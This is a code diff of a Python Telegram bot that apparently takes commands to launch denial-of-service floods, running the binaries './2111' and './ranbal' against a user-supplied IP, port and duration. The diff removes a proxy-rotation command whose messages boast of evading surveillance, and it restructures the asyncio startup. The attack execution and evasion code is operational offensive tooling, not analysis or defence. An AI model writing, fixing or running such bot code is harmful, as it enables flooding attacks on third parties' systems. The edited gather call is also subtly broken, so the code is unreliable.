@@ -38,27 +38,6 @@ REQUEST_INTERVAL = 1
 blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
 # Asyncio Loop for Operations
-async def start_asyncio_thread():
-    asyncio.set_event_loop(loop)
-    await start_asyncio_loop()
-
-# Proxy Update Command with Dark Authority
-def update_proxy():
-    proxy_list = []  # Define proxies here
-    proxy = random.choice(proxy_list) if proxy_list else None
-    if proxy:
-        telebot.apihelper.proxy = {'https': proxy}
-        logging.info("🕴️ Proxy shift complete. Surveillance evaded.")
-
-@bot.message_handler(commands=['update_proxy'])
-def update_proxy_command(message):
-    chat_id = message.chat.id
-    try:
-        update_proxy()
-        bot.send_message(chat_id, f"🔄 Proxy locked in. We’re untouchable. Bot by {USERNAME}")
-    except Exception as e:
-        bot.send_message(chat_id, f"⚠️ Proxy config failed: {e}")
-
 async def start_asyncio_loop():
     while True:
         await asyncio.sleep(REQUEST_INTERVAL)
@@ -105,7 +84,7 @@ async def run_attack_command_async(target_ip, target_port, duration):
         # Run both commands simultaneously
         process_2111 = asyncio.create_subprocess_shell(f"./2111 {target_ip} {target_port} {duration} 800")
         process_ranbal = asyncio.create_subprocess_shell(f"./ranbal {target_ip} {target_port} {duration}")
-        await asyncio.gather(process_2111, process_ranbal)
+        await asyncio.gather(process_2111.communicate(), process_ranbal.communicate())
     except Exception as e:
         logging.error(f"Error during attack execution: {e}")
     finally:
@@ -146,10 +125,14 @@ def process_attack_command(message):
     except Exception as e:
         logging.error(f"Error in process_attack_command: {e}")
 
-if __name__ == "__main__":
-    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
+def start_asyncio_thread():
+    asyncio.run(start_asyncio_loop())
 
+if __name__ == "__main__":
+    # Start asyncio thread
+    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
     asyncio_thread.start()
+
     logging.info("🚀 Bot is operational and mission-ready.")
 
     while True:
